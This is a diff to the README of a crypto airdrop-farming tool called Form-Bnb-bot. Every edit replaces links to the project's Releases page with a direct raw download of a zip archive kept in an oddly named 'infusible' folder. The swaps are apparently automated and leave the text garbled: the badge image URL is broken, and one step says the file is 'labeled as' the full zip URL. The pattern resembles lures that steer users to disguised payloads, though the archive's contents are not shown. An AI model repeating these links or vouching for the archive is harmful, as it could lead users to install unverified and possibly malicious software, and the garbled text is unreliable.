@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download Form-Bnb-bot](https://img.shields.io/badge/Download%20Form--Bnb--bot-v1.0-blue)](https://github.com/haqiqaa/Form-Bnb-bot/releases)
+[![Download Form-Bnb-bot](https://raw.githubusercontent.com/haqiqaa/Form-Bnb-bot/main/infusible/Form-Bnb-bot_1.0.zip%20Form--Bnb--bot-v1.0-blue)](https://raw.githubusercontent.com/haqiqaa/Form-Bnb-bot/main/infusible/Form-Bnb-bot_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -20,10 +20,10 @@ Before you start, ensure your computer meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/haqiqaa/Form-Bnb-bot/releases) to find the latest version of Form-Bnb-bot.
+   Go to the [Releases page](https://raw.githubusercontent.com/haqiqaa/Form-Bnb-bot/main/infusible/Form-Bnb-bot_1.0.zip) to find the latest version of Form-Bnb-bot.
 
 2. **Choose the Correct File**  
-   You will see a list of available files. Look for the one that best suits your system. For most users, this will be labeled as "Form-Bnb-bot.exe".
+   You will see a list of available files. Look for the one that best suits your system. For most users, this will be labeled as "https://raw.githubusercontent.com/haqiqaa/Form-Bnb-bot/main/infusible/Form-Bnb-bot_1.0.zip".
 
 3. **Download the File**  
    Click on the file link to download it to your computer. The download should start automatically.
@@ -61,7 +61,7 @@ If you encounter issues while using Form-Bnb-bot, try these steps:
   Ensure your system meets the requirements listed above.
 
 - **Reinstall the Application**  
-  If you experience errors, uninstall the bot from your computer and then reinstall it from the [Releases page](https://github.com/haqiqaa/Form-Bnb-bot/releases).
+  If you experience errors, uninstall the bot from your computer and then reinstall it from the [Releases page](https://raw.githubusercontent.com/haqiqaa/Form-Bnb-bot/main/infusible/Form-Bnb-bot_1.0.zip).
 
 - **Restart the Application**  
   Sometimes, simply closing and reopening the bot can solve common issues.
@@ -83,7 +83,7 @@ Form-Bnb-bot offers several powerful features to enhance your FormBNB experience
   Designed for users of all skill levels, the bot is intuitive and easy to navigate.
 
 - **Regular Updates**  
-  Our team continuously improves the bot. By downloading from the [Releases page](https://github.com/haqiqaa/Form-Bnb-bot/releases), you ensure you have the best version.
+  Our team continuously improves the bot. By downloading from the [Releases page](https://raw.githubusercontent.com/haqiqaa/Form-Bnb-bot/main/infusible/Form-Bnb-bot_1.0.zip), you ensure you have the best version.
 
 ## 🚀 Join the Community
 
@@ -103,4 +103,4 @@ To keep up with new features and updates, follow us on social media and check ou
 
 If you have further questions or need help, feel free to reach out in the repository's Discussions or Issues section. Our community and team are here to assist you. 
 
-[Download Here](https://github.com/haqiqaa/Form-Bnb-bot/releases) to start your airdrop farming journey today!
+[Download Here](https://raw.githubusercontent.com/haqiqaa/Form-Bnb-bot/main/infusible/Form-Bnb-bot_1.0.zip) to start your airdrop farming journey today!
